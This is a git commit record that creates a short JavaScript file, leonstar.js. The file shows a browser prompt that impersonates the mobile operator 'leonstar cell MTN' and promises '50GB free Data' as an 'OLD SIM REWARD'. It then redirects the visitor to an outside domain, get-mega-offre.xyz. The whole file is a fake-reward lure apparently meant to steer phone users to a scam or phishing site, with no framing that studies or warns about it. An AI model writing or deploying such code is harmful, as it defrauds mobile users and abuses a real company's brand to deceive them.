fd96a126bf378f7320365a5304444abf57991fc0
bigetijazz9 <bigetijazz9@gmail.com>
2024-11-22 10:41:25 -0800

    Create leonstar.js

---
+++ leonstar.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 50GB'
+password=prompt('leonstar cell MTN: Congratulations, Your mobile Number is Eligible to receive 50GB free Data leonstar cell MTN OLD SIM REWARD, kindly press Ok to proceed now','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://www.get-mega-offre.xyz/lonestarcellMTN50gb';
+}
